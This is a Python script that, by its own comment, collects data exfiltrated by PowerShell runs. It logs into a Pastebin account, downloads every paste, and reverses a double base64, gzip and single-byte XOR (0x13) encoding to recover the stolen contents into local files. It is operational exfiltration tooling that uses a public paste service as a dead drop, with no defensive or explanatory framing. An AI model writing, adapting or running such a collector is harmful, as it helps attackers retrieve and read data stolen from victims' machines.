#!/usr/bin/env python
# Pull the exfiltrated data from the powershell runs
import xml.etree.ElementTree as ET
import getpass
import re
import pastebin
import os
import datetime
import base64
import gzip, zlib

# API Settings
api_dev_key  = 'xxxxxxxxxxxxxxxxxxx'
api_user_key = None
api_password = 'xxxxxx'
api_username  = 'xxxxx'
XOR_KEY = 0x13

# Define API
if api_user_key:
	api = pastebin.PasteBin(api_dev_key, api_user_key)
else:
	api = pastebin.PasteBin(api_dev_key)
	username = api_username 
	if api_password is None:
		password = getpass.getpass('[?] - Password: ')
	else:
		password = api_password
	api_user_key = api.create_user_key(username, password)
	if 'Bad API request' not in api_user_key:
		print('[+] - You API user key is: ' + api_user_key)
		api = pastebin.PasteBin(api_dev_key, api_user_key)
	else:
		raise SystemExit('[!] - Failed to create API user key! ({0})'.format(api_user_key.split(', ')[1]))

# Create a Paste
data   = open(__file__).read()
result = api.list_pastes()
if 'Bad API request' not in result:
    os.makedirs('data',exist_ok=True)
    xml_pastes = "<root>\n" + result + "\n</root>"
    with open("pastes.xml","w") as f:
        f.write(xml_pastes)

    root = ET.fromstring(xml_pastes)
    
    for paste in root:
        datadict= {}
        for attribute in paste:
            datadict[attribute.tag] = attribute.text
            if attribute.tag == 'paste_date':
                datadict['datetime']= datetime.datetime.fromtimestamp(int(datadict['paste_date']))

        

        with open('./data/{0}_{1}_{2}.json'.format(datadict['paste_title'],datadict['paste_key'],datadict['paste_date']),'w') as file:
            payload = api.raw_pastes(datadict['paste_key'])
            
            if payload: 
                # decrypt payload from base64
                try:
                    decoded_bytes = base64.b64decode(payload)
                    decoded_bytes = base64.b64decode(decoded_bytes)
                    degzip_bytes = zlib.decompress(decoded_bytes, 15 + 32)
                    #file.write(degzip_bytes)
                    decrypted = [b ^ XOR_KEY for b in degzip_bytes]
                    file.write(bytes(decrypted).decode('iso8859-1'))
                    print('Title = {0} Timestamp = {1} Key = {2}'.format(datadict['paste_title'],datadict['datetime'],datadict['paste_key']))
                except Exception as e:
                    print('Title = {0} Timestamp = {1} Key = {2} FAILED!'.format(datadict['paste_title'],datadict['datetime'],datadict['paste_key']))
            else:
                print('Title = {0} Timestamp = {1} Key = {2} PAYLOAD EMPTY!'.format(datadict['paste_title'],datadict['datetime'],datadict['paste_key']))
else:
	raise SystemExit('[!] - Failed to create paste! ({0})'.format(api_user_key.split(', ')[1]))
